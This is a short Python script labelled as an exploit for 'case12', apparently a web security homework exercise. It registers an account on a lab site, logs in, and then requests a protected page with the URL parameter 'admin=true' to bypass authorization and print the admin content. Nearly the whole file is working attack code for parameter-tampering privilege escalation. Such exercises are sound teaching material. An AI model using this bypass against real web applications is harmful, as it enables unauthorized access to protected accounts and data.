#exploit for case12
import requests, hashlib 

def hash_password(password):
	m = hashlib.sha512()
	m.update(password)
	hashed_password = m.hexdigest()
	return hashed_password

username = "test" 
email = "test@gmail.com" 
password = "Abc123" 
hashed_password = hash_password(password)
 
url = "http://wsb.com/Homework3/case12/register.php" 
data = { "username": username, "email": email, "p": hashed_password } 
requests.post(url, data=data) 
 
session = requests.Session()  
url = "http://wsb.com/Homework3/case12/includes/process_login.php" 
data = { "email": email, "p": hashed_password } 
session.post(url, data=data) 
 
url = "http://www.wsb.com/Homework3/case12/protected_page.php?admin=true" 
response = session.get(url) 
print response.content
